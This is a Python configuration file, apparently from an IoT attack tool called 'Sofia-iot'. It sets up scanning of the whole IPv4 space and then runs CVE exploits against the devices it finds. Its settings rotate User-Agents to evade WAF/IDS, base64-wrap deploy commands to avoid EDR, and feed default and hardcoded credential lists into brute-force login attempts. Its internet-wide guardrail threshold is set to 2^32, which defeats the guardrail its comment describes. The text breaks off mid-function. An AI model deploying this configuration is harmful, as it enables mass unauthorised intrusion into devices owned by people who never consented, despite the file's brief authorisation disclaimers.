"""
Sofia-iot — Cấu hình chung.

Mọi tham số vận hành của pipeline đều khai báo tập trung tại đây:

  Giai đoạn 0 (target_generator) : DISCOVER_MODE, ZMAP_BANDWIDTH, SCAN_PORTS, ...
  Giai đoạn 1 (scanner)          : TIMEOUT, USER_AGENT(S), UA_MODE/UA_PORT_POOL
  Giai đoạn 2 (exploits)         : DEFAULT_CREDS(+CANDIDATES), ZTE_PAYLOAD_FILE, ZTE_ENDPOINT
  Giai đoạn 3 (verifier)         : VERIFIER_COMMAND, WEBROOT_CANDIDATES
  Giai đoạn 4 (webhook)          : WEBHOOK_URL, NOTIFY_ALL
"""

import os
import random
import re
import threading

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RESULTS_DIR = os.path.join(BASE_DIR, "results")
ZMAP_RAW_DIR = os.path.join(RESULTS_DIR, "zmap_raw")
STATE_FILE = os.path.join(RESULTS_DIR, "state.json")       # checkpoint/resume batch /16
RANGES_CACHE_FILE = os.path.join(ZMAP_RAW_DIR, "ranges.json")  # cache dải /16 đã sinh
SCAN_CACHE_DIR = os.path.join(RESULTS_DIR, "scan_cache")   # cache raw scan (P0)
EVIDENCE_DIR = os.path.join(RESULTS_DIR, "evidence")       # HTTP artifacts (P1)
LOG_DIR = RESULTS_DIR                                      # log ở results/ (P2)
LOG_FILE = os.path.join(LOG_DIR, "sofia.log")              # RotatingFileHandler
JSONL_FILE = os.path.join(LOG_DIR, "findings.jsonl")       # JSON log mỗi finding
LOG_MAX_BYTES = 10 * 1024 * 1024                            # 10 MB / file log
LOG_BACKUP_COUNT = 5

# ── Chung ───────────────────────────────────────────────────────────────
TIMEOUT = 10                # giây: timeout cho connect / HTTP / exploit
THREADS = 50                # số worker trong ThreadPoolExecutor
# ── User-Agent (nâng cấp: pool đa dạng + xoay vòng theo ngữ cảnh) ───────
# Trước đây chỉ có 1 UA cố định → mọi request chung một vân tay, dễ bị WAF/IDS
# gom nhóm theo header. Nâng cấp: giữ USER_AGENT làm mặc định/fallback (tương
# thích code cũ) nhưng bổ sung POOL để xoay vòng + chọn UA theo NGỮ CẢNH cổng
# dịch vụ (HTTP web, TR-069, UPnP/SOAP, client nhúng...).
#
#   USER_AGENT       : UA mặc định/fallback — dùng khi UA_ROTATE=False.
#   USER_AGENTS      : pool chung (browser + bot + client) — nguồn UA chính.
#   USER_AGENT_POOLS : pool theo nhóm ngữ cảnh:
#       "browser" — duyệt web thật (Win/mac/Linux/mobile; Chrome/FF/Safari/Edge)
#       "bot"     — crawler/search (Googlebot, bingbot, YandexBot, curl/wget)
#       "client"  — HTTP tool (curl/wget/python-requests/busybox) — khớp UA mà
#                   thiết bị nhúng hay dùng cho TR-069/UPnP/SOAP/XML-RPC
#       "iot"     — client nhúng (GoAhead/Boa/ROM-0/OpenSSL/Android WebView) —
#                   blend vào traffic cùng loại khi fingerprint dịch vụ nhúng
#   UA_MODE          : cách chọn UA mỗi request:
#       "random"      — ngẫu nhiên trong pool (mặc định)
#       "round_robin" — luân phiên tuần tự (tái lập được khi UA_SEED>0)
#       "fixed"       — luôn dùng USER_AGENT (không xoay)
#   UA_ROTATE        : False = tắt xoay vòng (tương đương UA_MODE="fixed").
#   UA_SEED          : >0 = seed để tái lập thứ tự (lab/debug); 0 = ngẫu nhiên.
#   UA_PORT_POOL     : map CỔNG → nhóm ngữ cảnh (chọn UA hợp cổng dịch vụ).
#                      Cổng không có trong map → dùng USER_AGENTS (pool chung).
#
# Ghi chú pháp lý/OPSEC: pool "bot" chỉ mô phỏng UA công khai cho mục đích
# kiểm thử được cấp phép; KHÔNG dùng để giả mạo danh tính crawler thật khi
# chưa được phép. Đặt UA_ROTATE=False để quay về UA đơn cố định.
USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0"

# Pool chung (nguồn UA chính khi không chỉ định ngữ cảnh).
USER_AGENTS = [
    # — Trình duyệt desktop (Chrome / Firefox / Edge / Safari) —
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    # — Di động —
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    # — Bot/crawler công khai —
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    # — HTTP client —
    "curl/8.7.1",
    "Wget/1.24.5",
    "python-requests/2.32.3",
]

# Pool theo nhóm ngữ cảnh — chọn theo cổng/dịch vụ hoặc chỉ định tay.
USER_AGENT_POOLS = {
    "browser": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
        "(KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) "
        "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    ],
    "bot": [
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
        "curl/8.7.1",
        "Wget/1.24.5",
    ],
    "client": [
        "curl/8.7.1",
        "Wget/1.24.5",
        "python-requests/2.32.3",
        "busybox/1.36.1 (2023-01-01 00:00:00 UTC)",
        "Device/1.0",
    ],
    "iot": [
        "Mozilla/5.0 (Linux; Android 8.1.0; SM-T580) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36",
        "GoAhead-Webs",
        "RomPager/4.07 UPnP/1.0",
        "Boa/0.94.14rc21",
        "OpenSSL/1.0.1e",
        "HiIpcCam/1.0",
    ],
}

UA_MODE = "random"        # "random" | "round_robin" | "fixed"
UA_ROTATE = True          # False = luôn dùng USER_AGENT
UA_SEED = 0               # >0 = tái lập thứ tự chọn/xoay vòng; 0 = ngẫu nhiên

# Chọn UA hợp cổng dịch vụ: cổng nhúng/XML-RPC/UPnP dùng UA "client"/"iot",
# cổng web thường dùng "browser". Cổng không có trong map → pool chung.
UA_PORT_POOL = {
    7547: "client",    # TR-069 (CWMP/SOAP)
    21009: "client",   # SonicWall GMS XML-RPC
    49152: "iot",      # UPnP/SSDP HTTP mô tả thiết bị
    1883: "client",    # MQTT-over-WS (nếu có)
    554: "iot",        # RTSP/HTTP mô tả luồng
}


def pick_user_agent(category=None, port=None, seed=None):
    """
    Chọn 1 User-Agent theo cấu hình (nâng cấp ở trên).

    Thứ tự ưu tiên khi xác định nhóm pool:
      1. `category` (chỉ định tay: "browser"/"bot"/"client"/"iot");
      2. `port` tra trong UA_PORT_POOL;
      3. USER_AGENTS (pool chung).

    Chế độ (UA_MODE):
      * "fixed"       : trả USER_AGENT (hoặc UA_ROTATE=False).
      * "random"      : ngẫu nhiên trong pool (seed → tái lập được).
      * "round_robin" : luân phiên tuần tự qua các lần gọi (thread-safe).

    Luôn có fallback an toàn: pool rỗng/không hợp lệ → USER_AGENT.
    """
    mode = (UA_MODE if UA_ROTATE else "fixed") or "fixed"
    if mode == "fixed":
        return USER_AGENT

    # Xác định pool hiệu dụng.
    grp = category
    if not grp and port is not None:
        try:
            grp = UA_PORT_POOL.get(int(port))
        except (TypeError, ValueError):
            grp = None
    pool = None
    if grp:
        pool = USER_AGENT_POOLS.get(grp)
    if not pool:
        pool = USER_AGENTS
    if not pool:
        return USER_AGENT

    rnd = random.Random(seed or UA_SEED) if (seed or UA_SEED) else random
    if mode == "round_robin":
        with _UA_RR_LOCK:
            idx = _UA_RR_STATE.get(grp or "*", 0)
            _UA_RR_STATE[grp or "*"] = idx + 1
        return pool[idx % len(pool)]
    return rnd.choice(pool)


# Trạng thái round-robin (nội bộ) — mỗi nhóm pool một con trỏ riêng.
_UA_RR_LOCK = threading.Lock()
_UA_RR_STATE = {}


# ── TLS (P1 OPSEC — dùng chung mọi HTTP qua tlsutil.py) ────────────────
# (khối TLS nằm ngay dưới; giữ ở đây để phần UA khép lại trọn vẹn.)
# __TLS_ANCHOR__


def user_agent_for_port(port, category=None):
    """Tiện ích ngắn: chọn UA theo cổng (wrapper của pick_user_agent)."""
    return pick_user_agent(category=category, port=port)


def user_agent_pool(category=None):
    """Trả về BẢN SAO pool UA hiệu dụng (không cho sửa trực tiếp config)."""
    if category and USER_AGENT_POOLS.get(category):
        return list(USER_AGENT_POOLS[category])
    return list(USER_AGENTS)

# ── TLS (P1 OPSEC — dùng chung mọi HTTP qua tlsutil.py) ────────────────
# Cipher browser-like (Chrome 12x): ECDHE + GCM/CHACHA20, ưu tiên AES-128.
TLS_MIN_VERSION = "TLSv1_2"
TLS_CIPHERS = [
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
]
TLS_CIPHERSUITES = [   # TLS 1.3
    "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384",
]
TLS_ALPN = ["http/1.1"]   # giữ HTTP/1.1 (code path raw socket, không HTTP/2)

# ── Giai đoạn 1: song song hóa fingerprint (P0) ─────────────────────────
FINGERPRINT_WORKERS = 200   # worker ThreadPoolExecutor cho stage1 fingerprint
FP_PER_HOST_LIMIT = 3       # số task fingerprint chạy đồng thời trên CÙNG 1 host
                            # (semaphore — tránh làm nghẽn thiết bị yếu)

# ── Rate-limit theo host giai đoạn exploit (P0 — 0.2) ───────────────────
# THREADS worker vẫn chạy song song nhiều host, NHƯNG mỗi HOST chỉ có tối đa
# EXPLOIT_PER_HOST_LIMIT task exploit/verify đồng thời (semaphore) — 50 threads
# không còn dồn 17 CVE vào 1 thiết bị cùng lúc. EXPLOIT_JITTER thêm chút trễ
# ngẫu nhiên (0..n giây) trước mỗi probe để tránh burst nhịp đều dễ bị nhận diện.
EXPLOIT_PER_HOST_LIMIT = 2
EXPLOIT_JITTER = 0.1         # giây, phạm vi ngẫu nhiên [0, EXPLOIT_JITTER)

# ── Guardrail internet-wide (P0 — 0.1, fail-closed) ─────────────────────
# Kế hoạch quét vượt quá ngưỡng này (tính bằng tổng số IP trong các dải CIDR)
# bắt buộc phải có cờ --confirm-internet-wide mới được chạy — chống vô tình
# quét toàn IPv4 khi chỉ gõ `python3 main.py`. Mặc định 16.7M ≈ một dải /8.
INTERNET_WIDE_HOSTS = 4_294_967_296

# ── Giai đoạn 0: Discovery ──────────────────────────────────────────────
DISCOVER_MODE = True        # True = chạy zmap/masscan; False = đọc targets.txt
ZMAP_BANDWIDTH = "100M"     # băng thông zmap, VD "1M", "100M", "1G"
ZMAP_INTERFACE = ""         # để trống = mặc định; VD "eth0"
# ── Engine phát hiện (--engines) ─────────────────────────────────────────
# zmap (mặc định): KHÔNG dùng masscan. Engine tự sinh 1 dải IPv4 /16 NGẪU
#   NHIÊN rồi dùng zmap quét TẤT CẢ cổng trong SCAN_PORTS để tìm cổng mở;
#   kết quả ghi dạng "IP:Port" (1 dòng/kết quả) → ZMAP_SCAN_FILE.
# masscan        : engine cũng tự sinh 1 dải IPv4 /16 NGẪU NHIÊN rồi dùng
#   masscan quét SCAN_PORTS; kết quả "IP:Port" → MASSCAN_SCAN_FILE.
# Cả hai engine dùng dải khai tay (--scan-range / config.SCAN_RANGES) nếu có;
# chỉ khi trống mới tự sinh dải /16 ngẫu nhiên.
DISCOVER_ENGINE = "zmap"     # "zmap" | "masscan"; CLI --engines ghi đè biến này
ZMAP_SCAN_FILE = os.path.join(ZMAP_RAW_DIR, "zmap_scan.txt")     # "IP:Port" mỗi dòng (engine zmap)
MASSCAN_SCAN_FILE = os.path.join(ZMAP_RAW_DIR, "mass_scan.txt")  # "IP:Port" mỗi dòng (engine masscan)
# ── Dải IPv4 /N ngẫu nhiên (engine tự sinh khi không khai tay) ───────────
RANDOM_RANGE_PREFIX = 16      # độ dài prefix dải ngẫu nhiên — /16 = 65536 IP
RANDOM_RANGE_SEED = 0         # 0 = ngẫu nhiên mỗi lần; >0 = tái lập được
RANDOM_RANGE_ATTEMPTS = 50    # số lần thử sinh dải hợp lệ (không private/blacklist)
MASSCAN_RATE = 1000          # packet/giây masscan khi quét cổng (polite)
# Chạy mặc định (không --scan-range): dùng 1 dải /16 ngẫu nhiên thay vì liệt kê
# toàn bộ AUTO_GEN_CIDR thành nhiều batch. Tắt để quay lại hành vi liệt kê cũ.
RANDOM_RANGE_MODE = False
# ── Auto-generate dải IPv4 /16 (nâng cấp: zmap tự sinh dải thay vì khai tay) ──
# Khi SCAN_RANGES rỗng và AUTO_GEN_RANGES=True, pipeline tự chia AUTO_GEN_CIDR
# thành các dải /16 (65536 IP/dải), xáo thứ tự, quét từng batch rồi gửi webhook.
# (RANDOM_RANGE_MODE=True ở trên sẽ thay bước này bằng 1 dải /16 ngẫu nhiên.)
# Resume theo từng dải qua STATE_FILE — chạy lại tiếp tục từ dải chưa xong.
AUTO_GEN_RANGES = True       # True = tự sinh dải /16 khi SCAN_RANGES trống
AUTO_GEN_CIDR = "0.0.0.0/0"  # dải gốc để chia — 0.0.0.0/0 = toàn bộ IPv4
AUTO_GEN_SPLIT_TO = 16       # chia thành chunk /N — mặc định 16 → 65536 dải /16
AUTO_GEN_SHUFFLE = True      # xáo thứ tự dải (tránh quét cụm 1 vùng liên tục)
AUTO_GEN_SEED = 0            # 0 = ngẫu nhiên mỗi lần; >0 = tái lập thứ tự xáo
AUTO_GEN_MAX_CHUNKS = 0      # 0 = tất cả; >0 = giới hạn số dải /16 (test nhanh)
# ── Batch + politeness ──────────────────────────────────────────────────
BATCH_SIZE = 1               # số dải /16 quét mỗi batch (1 batch = 1 checkpoint + webhook)
POLITENESS_SLEEP_MIN = 2.0   # giây ngủ tối thiểu giữa 2 batch (chống chặn)
POLITENESS_SLEEP_MAX = 8.0   # giây ngủ tối đa giữa 2 batch (ngẫu nhiên trong khoảng)
# ── Dọn file .txt sau mỗi batch (nâng cấp dọn tự động) ────────────────
# True = sau khi 1 batch /16 hoàn tất, tự xoá các file .txt trung gian trong
# results/ (results/zmap_raw/*.txt, results/scan_cache/*.txt...) TRƯỚC khi
# quét batch kế tiếp — tránh phình đĩa khi chạy dài nhiều batch.
# KHÔNG ảnh hưởng report JSON (findings/summary/fingerprints/state).
# Tắt qua CLI --no-cleanup-txt.
BATCH_CLEANUP_TXT = True
BATCH_CLEANUP_KEEP = []      # tên file .txt GIỮ LẠI (không dọn), VD ["zmap_scan.txt"]
# Cổng quét — đã mở rộng phủ mọi CVE trong registry:
#   37215 (Huawei HG532), 80/8080 (web IoT), 8443 (SonicWall GMS),
#   21009 (GMS XML-RPC), 443 (web IoT qua HTTPS), 7547 (TR-069)
#   + 22 (SSH — banner OpenSSH/Dropbear/libssh; phục vụ cụm CVE SSH:
#     CVE-2024-6387 regreSSHion, CVE-2018-10933 libssh bypass, CVE-2023-48795
#     Terrapin; quét banner không cần credential, an toàn với mọi daemon SSH)
#   + 23/554/1883/5683/49152 (P1 — banner telnet/RTSP/MQTT/CoAP/UPnP để
#     fingerprint thiết bị không có web UI; đánh đổi: quét nhiều cổng hơn
#     → masscan/zmap lâu hơn, nên cân nhắc bỏ bớt khi chỉ quan tâm web).
SCAN_PORTS = [22, 37215, 80, 8080, 8443, 443, 7547, 21009, 23, 554, 1883, 5683, 49152]

# ── regreSSHion (CVE-2024-6387) — đầu dò race OPT-IN ─────────────
# MẶC ĐỊNH TẮT: khai thác/đầu dò regreSSHion là race điều kiện thời gian, cần
# nhiều kết nối và CÓ THỂ GÂY QUÁ TẢI/DoS sshd mục tiêu. Chỉ bật khi bạn được
# phép rõ ràng và hiểu rủi ro. Khi bật, CVE_2024_6387.race_trigger() dùng
# ssh_common.race_probe() và CHỈ ghi nhận DẤU HIỆU heuristic (không phải RCE).
SSH_REGRESSHION_RACE_ENABLED = False  # True = bật đầu dò race (rủi ro DoS)
SSH_RACE_CONNECTIONS = 100            # số kết nối tối đa mỗi lần đầu dò
SSH_RACE_TIMEOUT = 5.0                # timeout mỗi kết nối (giây)
SSH_RACE_CONCURRENCY = 20             # số kết nối đồng thời tối đa

# ── CVE-2016-6210 — liệt kê user OpenSSH qua TIMING (hành vi CHỦ ĐỘNG) ───
# sshd ≤ 7.2p2 xử lý USERAUTH 'password' với mật khẩu dài khác thời gian cho
# user tồn tại vs không tồn tại (hàm băm tốn thời gian). Module đo nhiều mẫu
# và phân loại bằng thống kê vững (median + MAD) so với baseline các user
# NGẪU NHIÊN chắc chắn không tồn tại.
# LƯU Ý VẬN HÀNH: mỗi host mở (1 + n_user) × n_mẫu kết nối SSH — nặng hơn
# module banner. Giới hạn dưới đây giữ tải ở mức chấp nhận được; đặt
# SSH_USER_ENUM_ENABLED=False để chỉ còn phát hiện theo version (rẻ, nhưng
# KHÔNG liệt kê được user).
SSH_USER_ENUM_ENABLED = True          # True = đo timing thật; False = version-only
SSH_USER_ENUM_USERS = [               # danh sách user IoT phổ biến (ưu tiên thử)
    "root", "admin", "user", "ubuntu", "pi", "support",
    "guest", "test", "oracle", "postgres", "www-data", "nobody",
]
SSH_USER_ENUM_WORDLIST = ""           # file 1 user/dòng bổ sung ("" = không dùng)
SSH_USER_ENUM_MAX_USERS = 24          # trần số user ứng viên mỗi host (chống nổ tải)
SSH_USER_ENUM_SAMPLES = 4             # số mẫu timing MỖI user ứng viên
SSH_USER_ENUM_BASELINE = 4            # số mẫu baseline (user ngẫu nhiên = chắc chắn sai)
SSH_USER_ENUM_PASSWORD_LEN = 30000    # độ dài mật khẩu lớn (khuếch đại chênh lệch băm)
SSH_USER_ENUM_MIN_DELTA_MS = 15.0     # chênh lệch trung vị tối thiểu để coi là khác biệt (ms)
SSH_USER_ENUM_K = 6.0                # hệ số nhân độ tán xạ vững (1.4826×MAD) làm ngưỡng
SSH_USER_ENUM_TIMEOUT = 8.0          # timeout mỗi kết nối SSH (giây)
SSH_USER_ENUM_DELAY = 0.15            # nghỉ giữa các kết nối (giây) — lịch sự/tránh fail2ban

# ── Nạp kết quả scan có sẵn (--scan-file) thay vì quét lại ──────────────
# Cả hai engine đều ghi file kết quả dạng "IP:Port" (1 dòng/kết quả):
#   engine zmap    → ZMAP_SCAN_FILE    (results/zmap_raw/zmap_scan.txt)
#   engine masscan → MASSCAN_SCAN_FILE (results/zmap_raw/mass_scan.txt)
# --scan-file auto|all gộp MỌI file đang có, chuẩn hoá rồi chọn CVE theo cổng.
# Định dạng đọc được: "IP:Port" (chuẩn hoá), "IP" (zmap raw), "open tcp <p> <ip>" (masscan -oL).
MAX_CVES_PER_HOST = 0        # 0 = không giới hạn; >0 = chỉ khai thác N CVE điểm CVSS cao nhất/host

# Cache raw scan (P0): re-scan 1 dải giống hệt trong TTL → đọc cache thay vì
# gọi zmap/masscan lần nữa (resume/overlap không quét lại từ đầu).
SCAN_CACHE_TTL = 6 * 3600   # giây (6h)

# Discovery overlap (P0): prefetch discovery batch kế trong lúc exploit
# batch hiện tại — double buffer. Tắt nếu máy yếu RAM/CPU.
DISCOVERY_PREFETCH = True
# Dải IPv4 để zmap/masscan quét (CIDR). Trống = KHÔNG quét (fail-closed).
# Chỉ đưa vào dải bạn được phép kiểm thử (lab / mạng khách hàng).
# VD: ["192.0.2.0/24"] — quét 192.0.2.1-254 trên mọi SCAN_PORTS.
SCAN_RANGES = []             # dải CIDR khai tay (--scan-range / config). Trống = fail-closed,
                            # trừ khi AUTO_GEN_RANGES=True → tự sinh dải /16 từ AUTO_GEN_CIDR.
BLACKLIST_FILE = os.path.join(BASE_DIR, "blacklist.conf")
MAX_TARGETS = 100000          # giới hạn số IP đưa vào giai đoạn exploit (an toàn)
ALLOW_PRIVATE = False       # False = lọc RFC1918/loopback/link-local khỏi mục tiêu

# ── Chống bỏ sót / WAF / EDR ───────────────────────────────────────────
RETRY_ATTEMPTS = 2          # số lần thử lại tối đa (fingerprint/exploit) khi
                            # timeout / nghi WAF chặn / kết nối flaky
RETRY_BACKOFF = 0.5         # giây: chờ giữa các lần thử lại
EVASION_MODE = True         # xoay UA/header + biến thể payload né WAF
WAF_DETECT = True           # nhận diện WAF từ response, ghi chú vào finding
EDR_OBFUSCATE = True        # bọc lệnh deploy bằng base64 + tên biến ngẫu nhiên
FINGERPRINT_RETRY = True    # thử lại fingerprint khi lần đầu timeout
MAX_HTTP_PARSE = 20000      # số byte body tối đa dùng để tìm webroot/banner

# ── Giai đoạn 1: Fingerprint (scanner) ───────────────────────────────────
FINGERPRINT_TLS = True       # True = đọc CN/SAN từ chứng TLS trên cổng 443/8443/...
FINGERPRINT_BANNER = True    # True = probe banner specific per cổng (TR-069/SOAP/HTTP HEAD)
FINGERPRINT_EXTRA_PATHS = [  # path bổ sung quét chỉ khi thân page KHÔNG có marker (giảm âm)
    "/login.asp", "/web/login.html", "/userRpm/",
]
MAX_BANNER_BYTES = 4096      # số byte banner tối đa giữ từ probe cổng-specific

# ── Giai đoạn 2: Exploit — Credential (nâng cấp: đa ứng viên + fallback) ─
# Nhiều thiết bị IoT dùng default credential. Trước đây chỉ có MỘT cặp (user,
# pass) mỗi CVE và các module auth hardcode "admin:admin" → thiết bị đổi mật
# khẩu nhẹ là miss. Nâng cấp: mỗi CVE có DANH SÁCH ứng viên thử theo thứ tự
# (ưu tiên cao → thấp), cộng thêm pool chung dự phòng, và nạp thêm cred từ
# biến môi trường / file (lab hoặc mật khẩu khách hàng cung cấp).
#
#   DEFAULT_CREDS        : map CVE → (user, pass) — GIỮ NGUYÊN (tương thích
#                          ngược; cve_selector và code cũ vẫn đọc được).
#   DEFAULT_CRED_CANDIDATES : map CVE → list[(user, pass)] — thứ tự thử.
#                          Tự suy ra từ DEFAULT_CREDS (không lệch dữ liệu) +
#                          bổ sung ứng viên đa dạng cho từng CVE.
#   COMMON_CRED_CANDIDATES : pool default phổ biến IoT — dùng khi CVE không có
#                          ứng viên riêng, hoặc sau khi hết danh sách riêng
#                          (bật/tắt bằng CRED_TRY_COMMON).
#   CRED_EXTRA           : thêm cặp cred tay / từ env "SOFIA_CREDS"
#                          (dạng "user:pass,user2:pass2;user3:pass3").
#   CRED_FILE            : file wordlist "user:pass" mỗi dòng (env
#                          "SOFIA_CRED_FILE") — dùng cho lab/khách hàng.
#   CRED_TRY_COMMON      : True = thử cả pool chung khi hết cred riêng.
#   CRED_MAX_ATTEMPTS    : trần số cặp thử MỖI host (0 = không giới hạn) —
#                          chống lockout/khóa tài khoản thiết bị.
#   CRED_DELAY           : nghỉ (giây) giữa các lần thử cred — lịch sự/tránh
#                          fail2ban và giảm dấu hiệu brute-force.
#   CRED_STOP_ON_LOCKOUT : True = dừng khi gặp dấu hiệu khóa tài khoản
#                          (mã CRED_LOCKOUT_STATUS hoặc từ khóa trong body).
#   CRED_LOCKOUT_STATUS  : tập mã HTTP coi là dấu hiệu khóa/chặn (401/403/429).
#   CRED_SPRAY_ENABLED   : True = thử thêm ma trận user×pass (opt-in, NẶNG —
#                          chỉ bật khi được phép rõ ràng). Mặc định TẮT.
#   CRED_SELECT_COUNT_COMMON : True = cve_selector coi pool chung là "có cred"
#                          (bỏ điểm phạt requires-auth). Mặc định False để giữ
#                          đúng HÀNH VI CŨ của selector.
DEFAULT_CREDS = {
    "CVE-2022-30023": ("admin", "admin"),   # Tenda HG9
    "CVE-2023-33538": ("admin", "admin"),   # TP-Link WR940N/WR841N/WR740N
    "CVE-2025-1316":  ("admin", "1234"),    # Edimax IC-7100
    "CVE-2025-29635": ("admin", "admin"),   # D-Link DIR-823X
}

# Ứng viên bổ sung per-CVE (thứ tự: ứng viên đầu = ưu tiên cao nhất).
_CRED_EXTRA_PER_CVE = {
    "CVE-2022-30023": [("admin", "1234"), ("admin", "password"), ("root", "root")],
    "CVE-2023-33538": [("admin", "1234"), ("admin", "admin123"), ("admin", "")],
    "CVE-2025-1316":  [("admin", "admin"), ("admin", ""), ("root", "1234")],
    "CVE-2025-29635": [("admin", "1234"), ("admin", "password")],
    "CVE-2018-0296":  [("admin", "admin"), ("cisco", "cisco"), ("enable", "")],
    "CVE-2020-29583": [("zyad5001", "SuPp0rT"), ("admin", "admin")],  # Zyxel hardcoded
    "CVE-2023-30799": [("admin", "")],                                  # MikroTik priv-esc sau khi auth admin
}


def _build_cred_candidates():
    """Gộp DEFAULT_CREDS + ứng viên bổ sung → map CVE → list[(user, pass)] (dedupe)."""
    out = {}
    for cve, pair in DEFAULT_CREDS.items():
        seq = [tuple(pair)]
        seq += [tuple(p) for p in _CRED_EXTRA_PER_CVE.get(cve, [])]
        out[cve] = _dedupe_pairs(seq)
    for cve, seq in _CRED_EXTRA_PER_CVE.items():
        if cve not in out:
            out[cve] = _dedupe_pairs([tuple(p) for p in seq])
    return out


def _dedupe_pairs(seq):
    """Loại cặp (user, pass) trùng, giữ thứ tự xuất hiện đầu tiên."""
    seen = set()
    out = []
    for u, p in seq:
        key = (str(u), str(p))
        if key not in seen:
            seen.add(key)
            out.append((u, p))
    return out


# Pool default phổ biến cho thiết bị IoT (fallback khi thiếu cred riêng).
COMMON_CRED_CANDIDATES = [
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("admin", "12345"), ("admin", "admin123"), ("admin", ""),
    ("root", "root"), ("root", "admin"), ("root", ""),
    ("user", "user"), ("guest", "guest"), ("support", "support"),
    ("ubnt", "ubnt"), ("pi", "raspberry"),
]

# Ma trận spray user×pass (chỉ dùng khi CRED_SPRAY_ENABLED=True).
CRED_USERNAMES = ["admin", "root", "user", "support", "guest"]
CRED_PASSWORDS = ["admin", "password", "1234", "12345", "root", "support", ""]

CRED_TRY_COMMON = True
CRED_MAX_ATTEMPTS = 12        # 0 = không giới hạn (không khuyến nghị)
CRED_DELAY = 0.2              # giây giữa các lần thử cred
CRED_STOP_ON_LOCKOUT = True
CRED_LOCKOUT_STATUS = {401, 403, 429}
CRED_SPRAY_ENABLED = False    # opt-in — ma trận user×pass (nặng, dễ lockout)
CRED_SELECT_COUNT_COMMON = False


# Cred tay / từ env "SOFIA_CREDS" — dạng "user:pass,user2:pass2;user3:pass3".
def _parse_cred_pairs(text):
    """Parse chuỗi cred → list[(user, pass)] (bỏ mục sai định dạng)."""
    out = []
    if not text:
        return out
    for chunk in re.split(r"[;,\n]+", text):
        chunk = chunk.strip()
        if not chunk or ":" not in chunk:
            continue
        u, _, p = chunk.partition(":")
        out.append((u.strip(), p.strip()))
    return out


CRED_EXTRA = _parse_cred_pairs(os.environ.get("SOFIA_CREDS", ""))
CRED_FILE = os.environ.get("SOFIA_CRED_FILE", "")   # "user:pass" mỗi dòng


DEFAULT_CRED_CANDIDATES = _build_cred_candidates()


def _load_cred_file(path):
    """Đọc wordlist cred từ file (fail-open: file lỗi → list rỗng)."""
    if not path:
        return []
    try:
        with open(path, encoding="utf-8") as fh:
            return _parse_cred_pairs(fh.read())
    except OSError:
        return []


_CRED_FILE_CACHE = {"path": None, "pairs": None}


def _cred_file_pairs():
    """Cred từ CRED_FILE (cache theo đường dẫn để không đọc lại mỗi lần)."""
    path = CRED_FILE
    if _CRED_FILE_CACHE["path"] != path:
        _CRED_FILE_CACHE["path"] = path
        _CRED_FILE_CACHE["pairs"] = _load_cred_file(path)
    return _CRED_FILE_CACHE["pairs"] or []


def get_default_creds(cve):
    """Trả về cặp (user, pass) ưu tiên cao nhất cho CVE — hoặc None (tương thích cũ)."""
    seq = cred_candidates(cve, include_common=False)
    return seq[0] if seq else None


def has_cve_creds(cve):
    """True nếu có cred RIÊNG cho CVE (không tính pool chung) — dùng cho selector."""
    if cve in DEFAULT_CRED_CANDIDATES and DEFAULT_CRED_CANDIDATES[cve]:
        return True
    # cred tay/env/file được coi là có sẵn cho mọi CVE
